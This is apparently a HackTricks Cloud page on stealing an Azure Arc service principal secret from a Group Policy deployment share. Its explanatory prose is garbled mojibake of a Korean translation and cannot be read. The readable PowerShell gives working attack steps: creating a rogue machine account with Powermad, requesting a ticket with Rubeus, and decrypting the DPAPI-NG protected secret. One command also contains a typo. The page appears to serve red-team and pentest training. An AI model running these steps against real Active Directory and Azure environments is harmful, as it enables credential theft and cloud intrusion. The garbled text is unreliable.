# Az - Arc vulnerable GPO Deploy Script

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Identifying the Issues

Azure ArcëŠ” ê·¸ë£¹ ì •ì±… ê°œì²´ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ìƒˆë¡œìš´ ë‚´ë¶€ ì„œë²„(ë„ë©”ì¸ì— ê°€ì…ëœ ì„œë²„)ë¥¼ Azure Arcì— í†µí•©í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ MicrosoftëŠ” ì˜¨ë³´ë”© ì ˆì°¨ë¥¼ ì‹œì‘í•˜ëŠ” ë° í•„ìš”í•œ ë°°í¬ íˆ´í‚·ì„ ì œê³µí•©ë‹ˆë‹¤. ArcEnableServerGroupPolicy.zip íŒŒì¼ ë‚´ì—ëŠ” ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤: DeployGPO.ps1, EnableAzureArc.ps1, ë° AzureArcDeployment.psm1.

DeployGPO.ps1 ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒ ì‘ì—…ì´ ìˆ˜í–‰ë©ë‹ˆë‹¤:

1. ë¡œì»¬ ë„ë©”ì¸ ë‚´ì— Azure Arc ì„œë²„ ì˜¨ë³´ë”© GPOë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
2. ì˜¨ë³´ë”© í”„ë¡œì„¸ìŠ¤ë¥¼ ìœ„í•´ ìƒì„±ëœ ì§€ì •ëœ ë„¤íŠ¸ì›Œí¬ ê³µìœ ì— EnableAzureArc.ps1 ì˜¨ë³´ë”© ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë³µì‚¬í•˜ë©°, ì´ ê³µìœ ì—ëŠ” Windows ì„¤ì¹˜ íŒ¨í‚¤ì§€ë„ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ë•Œ ì‹œìŠ¤í…œ ê´€ë¦¬ìëŠ” ë‘ ê°€ì§€ ì£¼ìš” ë§¤ê°œë³€ìˆ˜ì¸ **ServicePrincipalId**ì™€ **ServicePrincipalClientSecret**ì„ ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤. ë˜í•œ ë„ë©”ì¸, ê³µìœ ë¥¼ í˜¸ìŠ¤íŒ…í•˜ëŠ” ì„œë²„ì˜ FQDN, ê³µìœ  ì´ë¦„ê³¼ ê°™ì€ ë‹¤ë¥¸ ë§¤ê°œë³€ìˆ˜ë„ í•„ìš”í•©ë‹ˆë‹¤. í…Œë„ŒíŠ¸ ID, ë¦¬ì†ŒìŠ¤ ê·¸ë£¹ ë° ê¸°íƒ€ í•„ìš”í•œ ì •ë³´ì™€ ê°™ì€ ì¶”ê°€ ì„¸ë¶€ì •ë³´ë„ ìŠ¤í¬ë¦½íŠ¸ì— ì œê³µí•´ì•¼ í•©ë‹ˆë‹¤.

ì•”í˜¸í™”ëœ ë¹„ë°€ì€ DPAPI-NG ì•”í˜¸í™”ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§€ì •ëœ ê³µìœ ì˜ AzureArcDeploy ë””ë ‰í† ë¦¬ì— ìƒì„±ë©ë‹ˆë‹¤. ì•”í˜¸í™”ëœ ë¹„ë°€ì€ encryptedServicePrincipalSecretì´ë¼ëŠ” ì´ë¦„ì˜ íŒŒì¼ì— ì €ì¥ë©ë‹ˆë‹¤. ì´ ë‚´ìš©ì€ DeployGPO.ps1 ìŠ¤í¬ë¦½íŠ¸ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©°, ì—¬ê¸°ì„œ ProtectBase64ë¥¼ í˜¸ì¶œí•˜ì—¬ $descriptorì™€ $ServicePrincipalSecretì„ ì…ë ¥ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ê°€ ìˆ˜í–‰ë©ë‹ˆë‹¤. descriptorëŠ” ë„ë©”ì¸ ì»´í“¨í„° ë° ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ ê·¸ë£¹ SIDë¡œ êµ¬ì„±ë˜ì–´ ìˆì–´, ServicePrincipalSecretì€ ë„ë©”ì¸ ì»¨íŠ¸ë¡¤ëŸ¬ ë° ë„ë©”ì¸ ì»´í“¨í„° ë³´ì•ˆ ê·¸ë£¹ì— ì˜í•´ì„œë§Œ ë³µí˜¸í™”ë  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.
```powershell
# Encrypting the ServicePrincipalSecret to be decrypted only by the Domain Controllers and the Domain Computers security groups
$DomainComputersSID = "SID=" + $DomainComputersSID
$DomainControllersSID = "SID=" + $DomainControllersSID
$descriptor = @($DomainComputersSID, $DomainControllersSID) -join " OR "
Import-Module $PSScriptRoot\AzureArcDeployment.psm1
$encryptedSecret = [DpapiNgUtil]::ProtectBase64($descriptor, $ServicePrincipalSecret)
```
### Exploit

ë‹¤ìŒ ì¡°ê±´ì´ ìˆìŠµë‹ˆë‹¤:

1. ë‚´ë¶€ ë„¤íŠ¸ì›Œí¬ì— ì„±ê³µì ìœ¼ë¡œ ì¹¨íˆ¬í–ˆìŠµë‹ˆë‹¤.
2. Active Directory ë‚´ì—ì„œ ì»´í“¨í„° ê³„ì •ì„ ìƒì„±í•˜ê±°ë‚˜ ì œì–´í•  ìˆ˜ ìˆëŠ” ëŠ¥ë ¥ì´ ìˆìŠµë‹ˆë‹¤.
3. AzureArcDeploy ë””ë ‰í† ë¦¬ë¥¼ í¬í•¨í•˜ëŠ” ë„¤íŠ¸ì›Œí¬ ê³µìœ ë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.

AD í™˜ê²½ ë‚´ì—ì„œ ë¨¸ì‹  ê³„ì •ì„ ì–»ëŠ” ë°©ë²•ì€ ì—¬ëŸ¬ ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤. ê°€ì¥ ì¼ë°˜ì ì¸ ë°©ë²• ì¤‘ í•˜ë‚˜ëŠ” ë¨¸ì‹  ê³„ì • ì¿¼í„°ë¥¼ ì•…ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ ì·¨ì•½í•œ ACL ë˜ëŠ” ë‹¤ì–‘í•œ ë‹¤ë¥¸ ì˜ëª»ëœ êµ¬ì„±ìœ¼ë¡œ ì¸í•´ ë¨¸ì‹  ê³„ì •ì„ ì†ìƒì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤.
```powershell
Import-MKodule powermad
New-MachineAccount -MachineAccount fake01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
í•œ ë²ˆ ë¨¸ì‹  ê³„ì •ì„ ì–»ìœ¼ë©´, ì´ ê³„ì •ì„ ì‚¬ìš©í•˜ì—¬ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ë¦¬ëŠ” netonly í”Œë˜ê·¸ê°€ ìˆëŠ” runas.exe ëª…ë ¹ì„ ì‚¬ìš©í•˜ê±°ë‚˜ Rubeus.exeë¡œ íŒ¨ìŠ¤-ë”-í‹°ì¼“ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
runas /user:fake01$ /netonly powershell
```

```powershell
.\Rubeus.exe asktgt /user:fake01$ /password:123456 /prr
```
ë©”ëª¨ë¦¬ì— ì €ì¥ëœ ì»´í“¨í„° ê³„ì •ì˜ TGTë¥¼ ì‚¬ìš©í•˜ì—¬ ì„œë¹„ìŠ¤ ì£¼ì²´ ë¹„ë°€ì„ ë³µí˜¸í™”í•˜ëŠ” ë‹¤ìŒ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```powershell
Import-Module .\AzureArcDeployment.psm1

$encryptedSecret = Get-Content "[shared folder path]\AzureArcDeploy\encryptedServicePrincipalSecret"

$ebs = [DpapiNgUtil]::UnprotectBase64($encryptedSecret)
$ebs
```
ëŒ€ì•ˆìœ¼ë¡œ, [SecretManagement.DpapiNG](https://github.com/jborean93/SecretManagement.DpapiNG)ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ ì‹œì ì—ì„œ, ì•”í˜¸í™”ëœServicePrincipalSecret íŒŒì¼ê³¼ ë™ì¼í•œ ë„¤íŠ¸ì›Œí¬ ê³µìœ ì— ì €ì¥ëœ ArcInfo.json íŒŒì¼ì—ì„œ Azureì— ì—°ê²°í•˜ëŠ” ë° í•„ìš”í•œ ë‚˜ë¨¸ì§€ ì •ë³´ë¥¼ ìˆ˜ì§‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì—ëŠ” TenantId, servicePrincipalClientId, ResourceGroup ë“±ê³¼ ê°™ì€ ì„¸ë¶€ ì •ë³´ê°€ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ ì •ë³´ë¥¼ ì‚¬ìš©í•˜ì—¬ Azure CLIë¥¼ í†µí•´ ì†ìƒëœ ì„œë¹„ìŠ¤ ì£¼ì²´ë¡œ ì¸ì¦í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## References

* [https://xybytes.com/azure/Abusing-Azure-Arc/](https://xybytes.com/azure/Abusing-Azure-Arc/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
